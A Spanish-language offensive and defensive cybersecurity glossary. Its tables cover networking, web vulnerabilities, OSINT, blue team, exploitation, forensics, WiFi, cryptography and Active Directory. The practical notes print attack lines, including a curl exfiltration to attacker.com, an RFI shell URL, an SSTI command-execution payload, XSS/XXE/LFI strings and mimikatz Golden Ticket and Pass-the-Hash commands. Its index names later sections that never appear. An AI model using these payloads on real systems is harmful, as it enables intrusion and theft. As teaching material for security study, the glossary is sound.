# 📚 Diccionario de Conceptos

🔐 Tu referencia rápida de ciberseguridad ofensiva y defensiva.
Cada término incluye su definición concreta, una intuición práctica y un ejemplo breve cuando aplica.
¡Consúltalo antes de escribir un informe, preparar un script o explorar un nuevo vector! 🚀

---

## 📑 Índice

- [🌐 Red](#-red)
- [🕸️ Web](#️-web)
- [🔎 Reconocimiento y OSINT](#-reconocimiento-y-osint)
- [🛡️ Defensa y Blue Team](#️-defensa-y-blue-team)
- [🧨 Explotación y Post-explotación](#-explotación-y-post-explotación)
- [🔬 Forense Digital](#-forense-digital)
- [📡 WiFi](#-wifi)
- [🔑 Criptografía](#-criptografía)
- [🏛️ Active Directory y Windows](#️-active-directory-y-windows)
- [☁️ Cloud Security](#️-cloud-security)
- [📱 Seguridad Móvil](#-seguridad-móvil)
- [🧬 Malware y Análisis de Amenazas](#-malware-y-análisis-de-amenazas)
- [🧰 Herramientas Esenciales](#-herramientas-esenciales)
- [💡 Tips Extra](#-tips-extra)

---

## 🌐 Red

| Término | Definición | Nota práctica |
| --- | --- | --- |
| **TCP** | Protocolo orientado a conexión: garantiza entrega ordenada de bytes entre dos extremos mediante el three-way handshake (SYN → SYN-ACK → ACK). | Ideal para servicios que no toleran pérdida (HTTP, SSH, bases de datos). Si ves una conexión establecida, casi siempre hay una sesión TCP previa. |
| **UDP** | Protocolo sin conexión: paquetes ligeros sin confirmación ni orden garantizado. | Muy usado para DNS, SNMP, video y algunos escáneres. Si ves grandes volúmenes UDP inesperados, puede ser tunelización o exfiltración. |
| **IP** | Protocolo de Internet encargado de enrutar paquetes entre redes. Versiones IPv4 (32 bits) e IPv6 (128 bits). | Todo paquete IP lleva dirección origen y destino. Aprende notación CIDR (`/24`, `/16`) para calcular rangos de hosts rápidamente. |
| **ICMP** | Protocolo de mensajes de control: diagnóstico de red (ping, traceroute, mensajes de error). | Útil para host discovery. Algunos firewalls bloquean ICMP; en ese caso, usa escaneos TCP/UDP. `ping -c 1 <host>` confirma si un host responde. |
| **ARP** | Protocolo de resolución de direcciones que mapea IP ↔ MAC en una LAN. | Ataques de ARP spoofing permiten MITM local. `arp -a` muestra la tabla ARP del host; anomalías indican posible envenenamiento. |
| **Servicios** | Procesos o demonios escuchando en puertos (HTTP, SMTP, SSH, etc.). | Cuando un escáner encuentra un puerto abierto, el servicio indica el vector de ataque. Guarda el banner con `nc -nv <host> <port>` o `curl` para identificar la versión exacta. |
| **Versiones** | Números que indican la edición del software (ej. Apache 2.4.54). | Las versiones permiten cruzar contra CVEs en NVD o Exploit-DB. Si `nmap -sV` muestra `OpenSSH 8.2p1`, busca exploits conocidos para esa versión concreta. |
| **Vulnerabilidades** | Debilidades en software, configuración o lógica que permiten un abuso. | Se clasifican por severidad con CVSS (0-10). Documenta si es remota/local, autenticada/no autenticada, y qué condiciones la activan. |
| **Exploit** | Código o secuencia que activa una vulnerabilidad para lograr ejecución, fuga de información o escalada de privilegios. | Corre siempre en entornos controlados y aislados. Anota la versión exacta del exploit, los comandos y el resultado esperado para poder reproducirlo. |
| **Payload** | Carga útil entregada tras explotar una vulnerabilidad (shell, reverse shell, meterpreter, beacon). | Describe qué hace y cómo conecta: `payload=windows/x64/meterpreter/reverse_tcp`. Anótalo en el informe para explicar el impacto real. |
| **Consola/Terminal** | Interfaz de texto para ejecutar comandos (PowerShell, bash, cmd, zsh). | Usa `history`, `CTRL+R` y aliases para ser más eficiente. Mantén un bloc de notas con comandos útiles por sesión. |
| **Framework** | Conjunto de herramientas integradas que agrupan exploits, módulos y scripts (Metasploit, Empire, Sliver). | Permite repetir pasos de forma estructurada. Mantén un `workspace` por objetivo en Metasploit para no mezclar datos. |
| **DNS** | Sistema de nombres de dominio que traduce nombres legibles (google.com) a IPs. Registros: A, AAAA, MX, TXT, NS, CNAME, PTR. | Esencial en recon: `dig any target.com` revela toda la infraestructura DNS. Herramientas: `dig`, `dnsx`, `massdns`. |
| **DHCP** | Protocolo que asigna IPs automáticamente a dispositivos en la red (IP, máscara, gateway, DNS). | En labs, controlar DHCP ayuda a predecir rangos y detectar equipos no autorizados (rogue DHCP). Un servidor DHCP malicioso puede redirigir el gateway y hacer MITM. |
| **NAT** | Traducción de direcciones de red: permite que muchos dispositivos internos compartan una IP pública. | Al escanear desde internet, la IP visible puede ocultar múltiples hosts internos. Documenta siempre si estás detrás de NAT, cambia el vector de ataque. |
| **VLAN** | Red virtual que segmenta tráfico dentro de un mismo switch físico mediante tags 802.1Q. | Entender VLANs es clave para evaluar la segmentación. VLAN hopping (double tagging) puede exponer tráfico que debería estar aislado si el switch no está bien configurado. |
| **Firewall** | Dispositivo o software que filtra tráfico basándose en reglas (IP, puerto, protocolo, estado de conexión). | Diferencia entre puerto *filtrado* (firewall bloquea) y *cerrado* (no hay servicio). `nmap` distingue ambos estados con `-sS`. |
| **SMB** | Protocolo de compartición de archivos e impresoras en redes Windows (puertos 445/139). | Vector muy explotado: EternalBlue (MS17-010), relay attacks, null sessions. Enumera con `smbclient -L //<ip>` o `enum4linux`. |
| **RPC** | Llamada a procedimiento remoto: permite ejecutar funciones en otro sistema de la red. | En Windows expone múltiples servicios (WMI, DCOM). Enumera con `rpcclient` o `impacket`. Puerto 135 + rango dinámico. |
| **Port Forwarding** | Redirigir tráfico de un puerto local o remoto a través de un canal seguro (SSH, socat, chisel). | Útil en pivoting para exponer servicios internos. `ssh -L 8080:192.168.1.10:80 user@jumphost` expone el puerto 80 interno en tu localhost:8080. |
| **Tunneling** | Encapsular un protocolo dentro de otro para evadir restricciones de firewall o moverse en redes segmentadas. | Ejemplos: DNS tunneling (dnscat2), ICMP tunneling, HTTP tunneling. Genera tráfico anómalo que los IDS pueden detectar si no se hace con cuidado. |
| **Proxy Chains** | Encadenar múltiples proxies (SOCKS, HTTP) para anonimizar o pivotar el tráfico. | `proxychains nmap -sT <target>` enruta el escaneo a través de la cadena definida en `/etc/proxychains.conf`. Añade latencia significativa. |
| **mTLS** | TLS mutuo: tanto cliente como servidor se autentican con certificados. | Más seguro que TLS estándar; bloquea clientes no autorizados aunque tengan las credenciales correctas. Busca si el servidor acepta certificados autofirmados. |

---

## 🕸️ Web

| Término | Definición | Ejemplo / Consejo |
| --- | --- | --- |
| **Proxy** | Intermediario que intercepta tráfico HTTP/S para manipular peticiones y respuestas. | Burp Suite y ZAP son proxies; captura la request y edita parámetros desde Repeater para iterar sin recargar el navegador. |
| **Fuzzing** | Enviar entradas automáticas variadas para descubrir rutas, parámetros o comportamientos inesperados. | `ffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404`. Usa wordlists específicas (SecLists) y revisa respuestas 200/302/401/500. |
| **Inyección SQL** | Insertar código SQL en parámetros para romper o manipular consultas del backend. | `sqlmap -r request.txt --dbs`. Documenta el parámetro vulnerable, el payload y el tipo de inyección (blind, error-based, union). |
| **Cabeceras HTTP** | Metadatos que acompañan las peticiones/respuestas: `Server`, `X-Powered-By`, `CSP`, `HSTS`, `CORS`. | Un `Server: Apache/2.4.54` revela versión y posibles CVEs. Analiza cabeceras de seguridad con [securityheaders.com](https://securityheaders.com). |
| **Autenticación** | Mecanismo que verifica identidad (cookies de sesión, tokens JWT, OAuth, Basic Auth). | Anota qué cookies cambian al autenticarse, si tienen flags `HttpOnly`/`Secure`, y prueba token reuse o account takeover en Burp Intruder. |
| **CSRF** | Cross-Site Request Forgery: solicitud falsificada que se ejecuta con las credenciales de la víctima. | Crea un HTML con un `<form>` que envía POST a `transfer.php`. Si no hay token CSRF ni verificación de `Origin`, el ataque funciona. |
| **XSS** | Cross-Site Scripting: inyección de scripts en el navegador de la víctima a través de la aplicación. | Tres tipos: **reflejado** (URL), **almacenado** (BD/logs) y **DOM-based** (JS del cliente). Empieza con `"><script>alert(1)</script>` y escala a robo de cookies o keylogging. |
| **SSRF** | Server-Side Request Forgery: forzar al servidor a hacer peticiones internas o a servicios externos. | Prueba `http://127.0.0.1`, `http://169.254.169.254/latest/meta-data/` (AWS IMDS), y `http://[::1]` en parámetros de URL. Escala a lectura de archivos o RCE vía servicios internos. |
| **IDOR** | Insecure Direct Object Reference: acceso a objetos internos cambiando un identificador sin control de autorización. | `GET /api/invoice/1001` → cambia a `1002`. Si accedes a datos de otro usuario, es IDOR. Prueba también con UUIDs predecibles o hashes débiles. |
| **Directory Traversal** | Navegar fuera del directorio raíz usando secuencias `../` o encodings equivalentes. | `../../etc/passwd`, `....//....//etc/passwd` (doble encoding). Documenta la ruta exacta y el parámetro afectado. |
| **LFI** | Local File Inclusion: incluir archivos locales del servidor a través de un parámetro no sanitizado. | `?page=../../../../etc/passwd`. Escala a RCE vía log poisoning (`/var/log/apache2/access.log`) o PHP wrappers (`php://filter/convert.base64-encode/resource=index.php`). |
| **RFI** | Remote File Inclusion: incluir archivos remotos controlados por el atacante para ejecutar código. | Solo si `allow_url_include=On` en PHP (poco común hoy). `?page=http://attacker.com/shell.txt`. Suele estar desactivado por defecto. |
| **XXE** | XML External Entity: inyección en parsers XML para leer archivos locales o hacer SSRF. | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` en el body XML. Prueba en endpoints que acepten XML (SOAP, importaciones de archivo). |
| **SSTI** | Server-Side Template Injection: inyectar expresiones en motores de plantillas (Jinja2, Twig, FreeMarker) para lograr RCE. | En Jinja2: `{{7*7}}` devuelve `49` → vulnerable. Escala con `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`. |
| **Open Redirect** | Parámetro de URL que redirige a un dominio arbitrario sin validación. | `https://target.com/login?next=https://evil.com`. Se abusa para phishing y bypass de OAuth. Busca parámetros `redirect`, `url`, `next`, `return`. |
| **Clickjacking** | Superponer un iframe invisible sobre una página legítima para engañar al usuario y que haga clic sin saberlo. | Comprueba si falta la cabecera `X-Frame-Options: DENY` o `Content-Security-Policy: frame-ancestors 'none'`. |
| **HTTP Request Smuggling** | Confusión entre el frontend (proxy) y el backend sobre dónde termina una petición HTTP, permitiendo inyectar requests. | Busca discrepancias en el manejo de `Content-Length` vs `Transfer-Encoding`. Herramienta: `smuggler.py` o Burp Suite Pro. |
| **Deserialización insegura** | Convertir datos serializados (Java, PHP, Python pickle) sin validar, permitiendo RCE. | Busca cookies o parámetros en base64 que empiecen con `rO0AB` (Java serializado). Herramienta: `ysoserial` para generar gadget chains. |
| **OAuth / OIDC** | Estándar de autorización delegada; OIDC añade capa de autenticación sobre OAuth 2.0. | Revisa `redirect_uri` sin validación, `state` parameter ausente (CSRF), tokens con `none` algorithm, y open redirectors que roben el `code`. |
| **JWT** | JSON Web Token: token firmado (o cifrado) para transmitir claims entre partes. | Prueba cambiar el algoritmo a `none`, o de RS256 a HS256 con la clave pública. Herramienta: `jwt_tool`. Documenta algoritmo, claims y tiempo de expiración. |
| **CORS mal configurado** | Cross-Origin Resource Sharing permisivo que permite a dominios no autorizados leer respuestas con credenciales. | `Access-Control-Allow-Origin: *` con `Access-Control-Allow-Credentials: true` es la combinación crítica. Prueba con un origen arbitrario y observa la respuesta. |
| **Business Logic Flaw** | Fallo en la lógica de negocio de la aplicación que permite abusar flujos legítimos. | Ejemplos: precio negativo en un carrito, saltarse pasos de un wizard, reutilizar cupones. No los detecta un escáner automático; requiere análisis manual del flujo. |
| **GraphQL** | Lenguaje de consulta para APIs que expone un único endpoint con capacidad de introspección. | Ejecuta `{__schema{types{name}}}` para enumerar tipos. Busca mutaciones sin autorización, IDOR en queries y query depth abuse (DoS). |

---

## 🔎 Reconocimiento y OSINT

| Término | Definición | Aplicación rápida |
| --- | --- | --- |
| **Footprinting** | Recopilar información pública para definir el perímetro digital: IPs, dominios, tecnologías, empleados. | Incluye DNS, certificados, redes sociales, filtraciones públicas. Fase pasiva, sin tocar el objetivo directamente. |
| **OSINT** | Open Source Intelligence: inteligencia obtenida de fuentes públicas y abiertas. | Documenta cada fuente (Google, LinkedIn, Shodan, Pastebin) con fecha y query exacta para reproducibilidad. |
| **Subdominios** | Dominios bajo el mismo dominio raíz (`api.example.com`, `staging.example.com`). | Encuentra apps olvidadas con `subfinder -d target.com \| dnsx -resp`. Combina con `httpx` para verificar cuáles responden HTTP. |
| **Shodan** | Motor de búsqueda que indexa banners de servicios expuestos en internet. | `shodan search "org:Example" port:443` + filtros `vuln:CVE-XXXX`. Compara resultados con tus escaneos internos para detectar shadow IT. |
| **Wayback Machine** | Archivo histórico de páginas web (web.archive.org). | Extrae URLs antiguas con `waybackurls target.com \| grep "\.js$"` para ver endpoints y parámetros que ya no aparecen en el sitio actual. |
| **Google Dorking** | Operadores avanzados de búsqueda para encontrar información expuesta involuntariamente. | `site:target.com filetype:pdf`, `inurl:admin site:target.com`, `intitle:"index of" site:target.com`. Busca en GHDB (Google Hacking Database) para ideas. |
| **Certificate Transparency** | Logs públicos y auditables de todos los certificados SSL/TLS emitidos por CAs. | `crt.sh/?q=%.target.com&output=json` devuelve subdominios. Complementa `amass` y `subfinder` con resultados históricos. |
| **WHOIS / ASN** | WHOIS muestra el registrante de un dominio; el ASN agrupa rangos de IPs de una organización. | `whois target.com` revela contactos y nameservers. `whois -h whois.radb.net -- '-i origin AS12345'` devuelve todos los rangos CIDR de una empresa. |
| **Metadata** | Información embebida en documentos (PDF, DOCX, imágenes EXIF) sobre autor, SO, fechas y software. | `exiftool documento.pdf` puede revelar usuarios de dominio, rutas internas o versiones de Office. Usa `metagoofil` para descargar documentos masivamente. |
| **Email Harvesting** | Recolectar correos electrónicos de una organización para phishing o enumeración de usuarios. | `theHarvester -d target.com -b google,linkedin,hunter`. Valida correos con herramientas como `emailhippo` para reducir falsos positivos. |
| **Seguridad Humana (HUMINT)** | Recopilar información sobre personas: roles, relaciones, hábitos, dispositivos. | Documenta perfiles en LinkedIn y GitHub (leaks de commits, credenciales, infraestructura). Organiza hallazgos en `reports/osint/people.md`. |
| **Dorking en GitHub** | Buscar credenciales, tokens y configuraciones sensibles expuestas en repositorios públicos. | `org:target password`, `filename:.env DB_PASSWORD`, `filename:id_rsa`. Usa `trufflehog` o `gitleaks` para análisis masivo de repos. |
| **Pastebin / Leaks** | Plataformas donde se publican (a veces por accidente) credenciales, dumps y tokens. | Monitorea con `pwndb`, HIBP API o alerta de Google sobre `site:pastebin.com "target.com"`. |
| **Reconocimiento activo** | Interacción directa con el objetivo para obtener información: escaneos, banners, crawling. | Genera logs en el objetivo. Documenta con precisión qué acciones tomaste y en qué momento para el informe de pentest. |

---

## 🛡️ Defensa y Blue Team

| Término | Definición | Cómo ayuda |
| --- | --- | --- |
| **IDS/IPS** | Intrusion Detection/Prevention System: detecta (IDS) o bloquea (IPS) patrones maliciosos en el tráfico. | Herramientas: Suricata, Snort, Zeek. Registra falsos positivos y afina reglas. Un IPS mal configurado puede interrumpir tráfico legítimo. |
| **SIEM** | Security Information and Event Management: centraliza, normaliza y correlaciona logs de múltiples fuentes. | Herramientas: Splunk, Elastic SIEM, Wazuh. Configura alertas basadas en IOCs y umbrales de anomalía. |
| **EDR** | Endpoint Detection & Response: monitorea procesos, archivos, conexiones y comportamiento en cada host. | Opciones open source: Velociraptor, osquery, Wazuh agent. Complementa al SIEM con visibilidad a nivel de proceso y artefacto. |
| **SOC** | Security Operations Center: equipo y plataforma dedicados a monitorear, detectar y responder a incidentes 24/7. | Define niveles (L1/L2/L3), SLAs de respuesta y playbooks para los tipos de alerta más frecuentes. |
| **Threat Intelligence** | Información procesada sobre amenazas actuales: actores, TTPs, IOCs, campañas. | Fuentes: MISP, OpenCTI, TAXII feeds, VirusTotal. Integra IOCs en el SIEM para generar alertas automáticas. |
| **IOC** | Indicator of Compromise: artefacto observable que indica actividad maliciosa (hash MD5, IP, dominio, mutex). | Documenta y comparte IOCs en formato STIX/TAXII. Automatiza su ingesta en el SIEM para detección continua. |
| **TTPs** | Tactics, Techniques and Procedures: describe el *cómo* operan los atacantes, clasificado por MITRE ATT&CK. | Mapea cada hallazgo de una investigación a una técnica ATT&CK (T1059, T1003, etc.) para comunicar el riesgo con un lenguaje estándar. |
| **MITRE ATT&CK** | Base de conocimiento de tácticas y técnicas de adversarios basada en observaciones del mundo real. | Usa el navigator de ATT&CK para visualizar la cobertura de detección de tu stack de seguridad e identificar brechas. |
| **Hunting** | Búsqueda proactiva de señales de ataque en logs y telemetría antes de que llegue una alerta. | Formula hipótesis: "¿Hay procesos que llamen a PowerShell desde Word?". Usa Velociraptor o EQL en Elastic para validarla. |
| **Playbook** | Procedimiento documentado paso a paso para responder a un tipo específico de incidente. | Mantén plantillas en `defense/playbooks/` con comandos, contactos y decisiones. Revísalos tras cada incidente real. |
| **Correlación** | Relacionar eventos de múltiples sensores para reconstruir un ataque completo end-to-end. | Combina logs de Zeek (red), Suricata (alertas), Windows Event Logs y EDR para confirmar y cronologizar una campaña. |
| **Dashboards** | Paneles visuales (Grafana, Kibana) que muestran métricas, alertas y KPIs de seguridad en tiempo real. | Versiona dashboards en JSON y anota los filtros clave. Un buen dashboard reduce el tiempo de detección (MTTD). |
| **Zero Trust** | Modelo de seguridad que elimina la confianza implícita: verifica identidad y autorización en cada acceso, siempre. | Pilares: verificar explícitamente, mínimo privilegio, asumir que la brecha ocurrirá. Implementa con MFA, microsegmentación y acceso just-in-time. |
| **WAF** | Web Application Firewall: filtra, monitorea y bloquea tráfico HTTP malicioso antes de que llegue a la aplicación. | Herramientas: ModSecurity, AWS WAF, Cloudflare WAF. Complementa pero no reemplaza el desarrollo seguro. Aprende a hacer bypass de WAF en ejercicios autorizados. |
| **Honeypot** | Sistema trampa diseñado para atraer y registrar la actividad de atacantes. | Tipos: low-interaction (simula servicios) y high-interaction (sistema real). Herramientas: Cowrie (SSH), HoneyDB. Alerta inmediata si alguien lo toca. |
| **Incident Response** | Proceso estructurado para manejar incidentes de seguridad: preparación, detección, contención, erradicación, recuperación y lecciones aprendidas. | Sigue el marco NIST SP 800-61 o SANS PICERL. Documenta cada acción con timestamp para el informe post-incidente. |

---

## 🧨 Explotación y Post-explotación

| Término | Definición | Contexto de laboratorio |
| --- | --- | --- |
| **Pivoting** | Usar una máquina comprometida como trampolín para acceder a redes o segmentos no alcanzables directamente. | `ssh -D 1080 user@jumphost` crea un SOCKS proxy. También: `chisel`, `ligolo-ng`. Documenta cada segmento alcanzado. |
| **Lateral Movement** | Moverse horizontalmente entre hosts de la misma red usando credenciales robadas o vulnerabilidades. | Técnicas: Pass-the-Hash (`impacket-psexec`), WMI (`wmiexec.py`), SMB (`smbexec.py`). Documenta cada salto con credencial usada y timestamp. |
| **Exfiltración** | Extraer datos del entorno comprometido hacia un destino controlado por el atacante. | En labs: `curl --data @/etc/passwd http://attacker.com/exfil`. Métodos silenciosos: DNS tunneling (dnscat2), ICMP, HTTP covert channels. |
| **Persistence** | Técnicas para mantener acceso tras reinicios o cierres de sesión. | Linux: crontab, `~/.bashrc`, systemd services. Windows: Run keys, tareas programadas, WMI subscriptions, DLL hijacking. Limpia siempre al terminar el lab. |
| **Privilege Escalation** | Elevar privilegios de un usuario limitado a administrador, root o SYSTEM. | Linux: `sudo -l`, SUID/SGID, capabilities (`getcap -r / 2>/dev/null`), cron jobs escribibles. Windows: `whoami /priv`, servicios con rutas no entrecomilladas, tokens de impersonación. |
| **C2 (Command & Control)** | Infraestructura que permite al atacante enviar comandos y recibir resultados de hosts comprometidos. | Herramientas educativas: Sliver, Mythic, Covenant, Havoc. Siempre en redes aisladas. Estudia los protocolos (HTTP, DNS, SMB) y los IOCs que generan. |
| **Buffer Overflow** | Escribir más datos de los que un buffer puede contener, sobrescribiendo memoria adyacente (return address, SEH). | Proceso: fuzzing → encontrar offset exacto → controlar EIP/RIP → ROP/shellcode. Entornos de práctica: protostar, exploit.education. |
| **ROP (Return-Oriented Programming)** | Técnica de explotación que encadena pequeños fragmentos de código existente (gadgets) para ejecutar lógica arbitraria sin inyectar shellcode. | Útil cuando DEP/NX está activo. `ROPgadget`, `ropper` o pwntools automatizan la búsqueda de gadgets. |
| **Race Condition** | Condición donde el resultado depende del orden de ejecución de procesos concurrentes, que puede manipularse. | Ejemplos: TOCTOU (Time of Check to Time of Use), límites de tasa en APIs. Herramienta: Turbo Intruder en Burp para enviar requests simultáneas. |
| **Token Impersonation** | En Windows, robar o duplicar el token de acceso de un proceso privilegiado para actuar como él. | Requiere `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege`. Herramientas: `PrintSpoofer`, `JuicyPotato`, `GodPotato`. |

---

## 🔬 Forense Digital

| Término | Definición | Punto clave |
| --- | --- | --- |
| **Adquisición** | Copia forense bit a bit de discos o memoria (formatos E01, dd, AFF) para preservar la evidencia original. | Registra el hash (SHA-256/MD5) antes y después. Nunca trabajes sobre la imagen original; haz una copia de trabajo. |
| **Cadena de custodia** | Registro formal y cronológico de cada persona que accedió o manipuló la evidencia. | Documenta en `forensics/chain-of-custody.txt`: quién, cuándo, qué y por qué. Un error aquí invalida la evidencia en un proceso legal. |
| **Línea temporal** | Reconstrucción cronológica de eventos a partir de marcas temporales de múltiples fuentes. | `log2timeline.py` + `Timesketch` para visualizar. Ojo con diferencias de zona horaria y con que los relojes del sistema estén sincronizados (NTP). |
| **Memoria volátil** | Datos en RAM que se pierden al apagar: procesos activos, conexiones, claves de cifrado, credenciales en texto claro. | Extrae con `AVML` (Linux), `winpmem` (Windows) o `Belkasoft RAM Capturer`. Analiza con `Volatility 3`. |
| **Análisis de red (pcap)** | Revisar capturas de tráfico para identificar comunicaciones sospechosas, credenciales o transferencias de datos. | `Wireshark` para análisis manual; `Zeek` + `NetworkMiner` para extracción automática de archivos y metadatos de sesión. |
| **Artefactos** | Huellas que deja la actividad del sistema: logs, registros del SO, prefetch, shellbags, jump lists, MFT. | Windows: Event Logs (4624/4625/4688), Prefetch (`C:\Windows\Prefetch`), Amcache, SRUM. Linux: `auth.log`, `bash_history`, `/proc/`, systemd journal. |
| **Triage** | Recogida rápida de artefactos clave sin hacer imagen completa del disco, minimizando el impacto en el sistema. | Herramientas: KAPE (potente y configurable), Velociraptor (en red), CyLR. Ideal cuando el tiempo o el acceso es limitado. |
| **MFT (Master File Table)** | Tabla maestra del sistema de archivos NTFS que registra metadatos de cada archivo: nombres, timestamps, atributos. | `analyzeMFT.py` o `mftparser` extraen información. La MFT puede revelar archivos borrados y rutas de acceso aunque el archivo ya no exista. |
| **Registro de Windows** | Base de datos jerárquica que almacena configuración del SO, aplicaciones y actividad del usuario. | Hives clave: `NTUSER.DAT` (actividad de usuario), `SYSTEM`, `SOFTWARE`, `SAM` (hashes locales). Analiza con `RegRipper` o `Autopsy`. |
| **Análisis de malware** | Examinar una muestra maliciosa para entender su comportamiento, capacidades e IOCs. | Dos enfoques: **estático** (sin ejecutar: `strings`, `pestudio`, desensamblado) y **dinámico** (en sandbox: Cuckoo, ANY.RUN, FlareVM). |

---

## 📡 WiFi

| Término | Definición | Nota de seguridad |
| --- | --- | --- |
| **Handshake WPA2** | Intercambio de 4 mensajes (EAPOL) entre el cliente y el AP para verificar y derivar claves de sesión. | Captura con `airodump-ng` y desautentica un cliente con `aireplay-ng -0` para forzar la reconexión. El hash resultante se puede craquear offline. |
| **PMKID Attack** | Ataque sin necesidad de capturar un handshake completo: usa el PMKID del primer frame del AP. | `hcxdumptool -i wlan0 -o captura.pcapng --enable_status=1`. Convierte con `hcxpcapngtool` y craquea con `hashcat -m 22000`. No requiere un cliente conectado. |
| **Captura pasiva** | Escuchar tráfico WiFi sin transmitir nada, en modo monitor. | `airodump-ng wlan0mon`. Anota BSSID, canal, cifrado (WEP/WPA/WPA2/WPA3) y clientes antes de tomar acción. |
| **Cracking** | Probar diccionarios o reglas para recuperar la PSK (clave pre-compartida) WPA/WPA2 a partir del handshake. | `hashcat -m 22000 captura.hc22000 rockyou.txt -r rules/best64.rule`. GPU es mucho más rápido que CPU. |
| **Evil Twin** | Crear un AP falso que imita uno legítimo (mismo SSID, BSSID spoofed) para interceptar tráfico. | Solo en labs aislados y autorizados. Herramientas: `hostapd-wpe` (captura credenciales empresariales), `wifipumpkin3`. Genera logs forenses valiosos. |
| **MITM inalámbrico** | Interceptar y posiblemente modificar el tráfico WiFi en tiempo real entre cliente y AP legítimo. | Requiere Evil Twin o ARP spoofing en la red. Combina con `bettercap` para inyectar contenido o capturar credenciales HTTP. Solo en entornos autorizados. |
| **Deauth Attack** | Enviar frames de desautenticación falsificados para desconectar clientes de su AP. | `aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon`. Se usa para capturar handshakes o como DoS. Detectable con WIDS. |
| **WPS Attack** | Atacar el PIN WPS de 8 dígitos (en realidad dos mitades de 4 dígitos: 10.000 + 1.000 combinaciones). | `reaver -i wlan0mon -b <BSSID> -vv`. Muchos routers modernos tienen protección de bloqueo. Si WPS está activo, es un vector viable. |
| **WPA3** | Evolución de WPA2 con handshake SAE (Dragonfly): resistente a ataques de diccionario offline. | `hcxdumptool` soporta captura de SAE, pero el cracking es significativamente más costoso. Vulnerabilidades conocidas: Dragonblood (2019). |
| **Visualización** | Mapas de SSID/BSSID/potencia de señal para auditoría de cobertura y detección de APs no autorizados. | Herramientas: Kismet (potente, en tiempo real), Airgraph-ng (grafo de clientes/APs), WiFiAnalyzer (móvil). |

---

## 🔑 Criptografía

| Término | Definición | Contexto de seguridad |
| --- | --- | --- |
| **Criptografía simétrica** | Un único secreto compartido cifra y descifra (AES, ChaCha20, 3DES). | AES-256-GCM es el estándar actual. El reto es el intercambio seguro de la clave; por eso se combina con criptografía asimétrica. |
| **Criptografía asimétrica** | Par de claves (pública/privada): lo que cifra una solo lo descifra la otra (RSA, ECDSA, Ed25519). | RSA con clave de 2048 bits mínimo. Ed25519 es más moderno, rápido y seguro. Nunca compartas la clave privada. |
| **Hash criptográfico** | Función de una sola dirección que produce un digest de tamaño fijo a partir de cualquier entrada (SHA-256, SHA-3, BLAKE2). | Cualquier cambio mínimo en la entrada cambia completamente el hash (efecto avalancha). MD5 y SHA-1 están **rotos** para propósitos criptográficos. |
| **TLS/SSL** | Transport Layer Security: protocolo que cifra y autentica conexiones de red (HTTPS, IMAPS, etc.). | TLS 1.3 es el estándar actual; 1.0/1.1 están obsoletos y son vulnerables (POODLE, BEAST). Verifica la versión con `nmap --script ssl-enum-ciphers`. |
| **PKI** | Public Key Infrastructure: sistema de CAs, certificados X.509 y listas de revocación que permiten confianza distribuida. | Entender PKI es esencial para ataques de certificate pinning bypass, crear CAs propias en labs (mitmproxy, Burp) y analizar cadenas de confianza. |
| **Certificados X.509** | Documento digital que vincula una clave pública a una identidad, firmado por una CA. | Campos clave: `Subject`, `Issuer`, `SAN` (Subject Alternative Names), `Valid From/To`. Los SANs revelan subdominios adicionales. |
| **Salting** | Añadir un valor aleatorio único a cada contraseña antes de hacer el hash para evitar ataques de tabla rainbow. | Sin salt, dos usuarios con la misma contraseña tendrán el mismo hash. Con salt, son completamente distintos. Verifica si el almacenamiento usa bcrypt, argon2 o PBKDF2. |
| **Key Exchange (DH/ECDH)** | Protocolo que permite a dos partes establecer un secreto compartido sobre un canal inseguro. | Diffie-Hellman clásico y su variante de curva elíptica (ECDH) son la base de TLS y SSH. Vulnerable a downgrade si se permiten grupos débiles (DH-1024). |
| **Esteganografía** | Ocultar información dentro de archivos aparentemente inocuos (imágenes, audio, video). | `steghide`, `zsteg` para análisis. Relevante en CTFs y en análisis forense de malware que usa imágenes para C2 (steganoC2). |
| **Cifrado de disco** | Proteger el volumen completo o particiones con cifrado (BitLocker, LUKS, VeraCrypt). | Bitlocker puede desbloquearse con la clave de recuperación o atacarse si TPM está mal configurado. LUKS en Linux usa PBKDF2/argon2 para derivar la clave maestra. |

---

## 🏛️ Active Directory y Windows

| Término | Definición | Técnica ofensiva / defensiva |
| --- | --- | --- |
| **Active Directory (AD)** | Servicio de directorio de Microsoft para gestionar identidades, equipos y políticas en redes Windows. | El objetivo principal en pentests internos. Comprometer AD equivale a comprometer toda la organización. Herramienta de enumeración: `BloodHound`. |
| **LDAP** | Protocolo ligero de acceso a directorios usado por AD para consultar objetos (usuarios, grupos, OUs, GPOs). | `ldapsearch -H ldap://<dc_ip> -x -b "DC=domain,DC=com"`. Permite enumerar usuarios, grupos y políticas sin autenticación en configuraciones permisivas. |
| **Kerberos** | Protocolo de autenticación por tickets usado en AD. Flujo: AS-REQ → AS-REP (TGT) → TGS-REQ → TGS-REP (ST). | La mayoría de los ataques avanzados de AD abusan de Kerberos: Kerberoasting, AS-REP Roasting, Golden/Silver Ticket, Pass-the-Ticket. |
| **Kerberoasting** | Solicitar tickets de servicio (TGS) para cuentas con SPN y craquearlos offline para obtener la contraseña de la cuenta de servicio. | `GetUserSPNs.py domain/user:pass -dc-ip <ip> -request`. Craquea con hashcat `-m 13100`. Mitiga con contraseñas largas en cuentas de servicio y MSA/gMSA. |
| **AS-REP Roasting** | Ataque contra cuentas que tienen deshabilitada la pre-autenticación Kerberos: se obtiene un hash craqueable sin credenciales. | `GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip <ip>`. Craquea con hashcat `-m 18200`. Activa pre-autenticación en todas las cuentas. |
| **Pass-the-Hash (PtH)** | Usar el hash NTLM de una contraseña (en lugar de la contraseña en texto claro) para autenticarse. | `impacket-psexec -hashes :NTLM_HASH user@<target>`. Mitiga con Credential Guard, LAPS y limitando cuentas de admin locales comunes. |
| **Pass-the-Ticket (PtT)** | Inyectar un ticket Kerberos (TGT o ST) robado en la sesión actual para autenticarse como otro usuario. | `mimikatz "kerberos::ptt ticket.kirbi"`. Extrae tickets con `mimikatz` o `Rubeus`. |
| **Golden Ticket** | Forjar un TGT válido para cualquier usuario usando el hash NTLM de la cuenta `krbtgt`. | Requiere haber comprometido el DC. Persistencia total en el dominio. `mimikatz "kerberos::golden /user:Administrator /domain:... /sid:... /krbtgt:<hash>"`. |
